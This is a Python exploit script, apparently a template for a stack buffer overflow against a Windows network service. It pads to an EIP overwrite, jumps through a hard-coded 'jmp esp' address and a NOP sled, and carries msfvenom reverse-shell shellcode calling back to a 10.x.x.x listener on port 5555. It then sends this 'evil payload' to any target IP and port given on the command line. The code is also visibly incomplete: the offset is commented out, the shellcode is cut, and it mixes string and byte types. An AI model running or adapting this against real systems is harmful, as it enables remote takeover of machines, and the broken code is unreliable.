import socket
import sys
import logging

# buffer overflow size (location of return EIP on stack)
# offset = 512

# Junk to reach the EIP overwrite
buf="A"*offset

# address of jmp esp
# !mona jmp -e esp
buf+="\xf3\x12\x17\x31"

# Some NOP
buf+="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=10.x.x.x LPORT=5555 -f python  -b '\x00'
shellcode =  b""
shellcode += b"\xbf\xd1\x43\x7f\x39\xd9\xc7\xd9\x74\x24\xf4"
# [...cut...]

# append shellcode to evil buffer
buf += shellcode
# Append some additional data (optional)
buf += 'A' * 2000

# Add linefeed (required by network services to send the pyaload)
buf += '\r\n'


if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

data = s.recv(1024)

logging.debug("read data from server: ")
logging.debug(data)
logging.info("sending evil payload")
s.send(buf)
s.close()
